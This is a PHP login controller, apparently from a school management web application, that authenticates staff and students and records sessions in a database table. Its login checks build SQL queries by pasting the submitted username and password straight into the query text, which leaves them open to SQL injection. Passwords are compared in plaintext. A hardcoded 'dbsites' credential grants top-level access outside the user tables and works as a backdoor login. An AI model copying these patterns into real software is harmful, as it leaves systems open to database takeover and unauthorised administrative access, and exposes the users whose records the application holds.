<?php
class SegurancaController extends AppController {

	public    $uses          = array();
	public    $layout        = "seguranca";
	public    $levelDefaults = null;
	protected $requiredLevel = 0;
	
	public function __construct() {
		parent::__construct();
		$this->levelDefaults = Config::read("levelDefaults");		
	}
	
	public function index() {
		$this->redirect("/seguranca/login", null, true);		
	}
	
	public function login() {
		//$this->autoRender = false;
		Config::write("jsURL", "login.js");
		Model::query("DELETE FROM usuarios_logados WHERE(TIMESTAMPDIFF(MINUTE, created, CURRENT_TIMESTAMP) > 10)");
		
		if(!empty($this->data)) {						
			$nomeUsuario  = $this->data['usuario'];
			$senhaUsuario = $this->data['senha'];
							
			if($this->canFindUsuario($nomeUsuario, $senhaUsuario)) {
				
				$usuario = Model::fetch("SELECT nome, nivel FROM usuarios WHERE (usuarios.id = (SELECT usuario_id FROM login_usuario WHERE ( (login_usuario.login = '$nomeUsuario') AND (login_usuario.senha = '$senhaUsuario') )))");
				
				foreach($usuario as $row) {
					if(!Session::started()) Session::start();
					Session::write("name", "LogedIN");
					Session::write("horaLogin", strtotime('NOW'));
					Session::write("nomeUsuario",  $row['nome']);
					Session::write("nivelUsuario", $row['nivel']);						
					
					$sessionID =  session_id();
					$userName  = "'" . Session::read("nomeUsuario") . "'";
					$userLevel = Session::read("nivelUsuario");					
						
					$retorno = Model::query("INSERT INTO usuarios_logados VALUES('" . $sessionID . "'" . ", $userName, $userLevel, CURRENT_TIMESTAMP)");
					if(!$retorno) {
						$this->setFlash("Não Foi Possível Criar a Sessão!");									
					} else {						
						$this->redirect($this->levelDefaults[Session::read("nivelUsuario")]);	
					}
				}				
			}
			elseif($this->canFindAluno($nomeUsuario, $senhaUsuario)) {
				
				$aluno = Model::fetch("SELECT nome, matricula FROM alunos, login_aluno WHERE (login_aluno.aluno_id = (SELECT id FROM alunos WHERE (alunos.matricula = '$nomeUsuario')) AND (login_aluno.senha = '$senhaUsuario') AND (alunos.id = login_aluno.aluno_id))");
				
				foreach($aluno as $row) {
					if(!Session::started()) Session::start();
					Session::write("name", "LogedIN");
					Session::write("horaLogin", strtotime('NOW'));
					Session::write("nomeUsuario",  $row['nome']);
					Session::write("matricula", $row['matricula']);
					Session::write("nivelUsuario", 1);
				
					$sessionID =  session_id();
					$userName  = "'" . Session::read("nomeUsuario") . "'";
					$userLevel = Session::read("nivelUsuario");
											
					$retorno = Model::query("INSERT INTO usuarios_logados VALUES('" . $sessionID . "'" . ", $userName, $userLevel, CURRENT_TIMESTAMP)");
					if(!$retorno) {
						$this->setFlash("Não Foi Possível Criar a Sessão!");									
					} else {
						$this->redirect($this->levelDefaults[Session::read("nivelUsuario")]);	
					}
				}
				//$this->redirect($this->levelDefaults[Session::read("nivelUsuario")]);
				
			}			
			elseif($this->data['usuario'] == "dbsites" && $this->data['senha'] == "dbsites@@super") {
				if(!Session::started()) Session::start();
				Session::write("name", "LogedIN");
				Session::write("horaLogin", strtotime('NOW'));
				Session::write("nomeUsuario",  "Dbsites");				
				Session::write("nivelUsuario", 5);				

				$sessionID =  session_id();
				$userName  = "'" . Session::read("nomeUsuario") . "'";
				$userLevel = Session::read("nivelUsuario");
												
				$retorno = Model::query("INSERT INTO usuarios_logados VALUES('" . $sessionID . "'" . ", $userName, $userLevel, CURRENT_TIMESTAMP)");
												
				if(!$retorno) {
					$this->setFlash("Não Foi Possível Criar a Sessão!");									
				} else {					
					//$this->redirect($this->levelDefaults[Session::read("nivelUsuario")]);	
					$this->redirect($this->levelDefaults[Session::read("nivelUsuario")], null, true);
				}
				
				//$this->redirect($this->levelDefaults[Session::read("nivelUsuario")], null, true);
			}
			else {
				$this->setFlash('Usuário e/ou Senha Inválidos!');				
			}	
		}
	}
	
	public function logout() {
		$this->autoRender = false;
		if(!Session::started()) Session::start();
		
		$sessionID = "'" . session_id() . "'";		
			
		if(isset($_SESSION['matricula'])) Session::delete("matricula");
				
		Session::delete("name");
		Session::delete("horaLogin");
		Session::delete("nomeUsuario");
		Session::delete("nivelUsuario");
		Session::destroy();
		
		Model::query("DELETE FROM usuarios_logados WHERE usuarios_logados.session_id = $sessionID");
		Model::query("DELETE FROM usuarios_logados WHERE(TIMESTAMPDIFF(MINUTE, created, CURRENT_TIMESTAMP) > 10)");
		
		$this->redirect("/seguranca/login");		
	}
	
	private function canFindUsuario($nomeUsuario = null, $senhaUsuario = null) {
		$retorno = Model::fetch("SELECT COUNT(*) AS 'total' FROM login_usuario WHERE ( (login_usuario.login = '$nomeUsuario') AND (login_usuario.senha = '$senhaUsuario') )"); 
		
		foreach($retorno as $row) {
			if($row['total'] == 0) {
				return false;
			}
			else {
				return true;
			}
		}
	}
	
	private function canFindAluno($nomeUsuario = null, $senhaUsuario = null) {
		$retorno = Model::fetch("SELECT COUNT(*) AS 'total' FROM login_aluno WHERE ( (login_aluno.aluno_id = (SELECT id FROM alunos WHERE (alunos.matricula = '$nomeUsuario')) ) AND (login_aluno.senha = '$senhaUsuario'))"); 
		
		foreach($retorno as $row) {
			if($row['total'] == 0) {
				return false;
			}
			else {
				return true;
			}
		}
	}
	
}
